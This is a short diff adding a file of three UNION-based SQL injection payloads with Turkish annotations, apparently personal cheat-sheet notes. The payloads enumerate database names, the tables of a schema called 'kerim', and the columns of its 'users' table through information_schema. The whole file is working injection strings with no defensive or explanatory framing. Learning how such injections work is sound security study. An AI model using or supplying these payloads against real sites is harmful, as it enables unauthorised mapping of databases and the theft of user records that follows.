@@ -1,0 +1,7 @@
+kerim' UNION SELECT 1, schema_name, 3, 4 FROM information_schema.schemata #    = veritabanı isimlerini gör
+
+
+
+' UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema = 'kerim' # = tablo isimlerini gör
+
+' UNION SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_schema = 'kerim' AND table_name = 'users' #  = kolon isimlerini gör
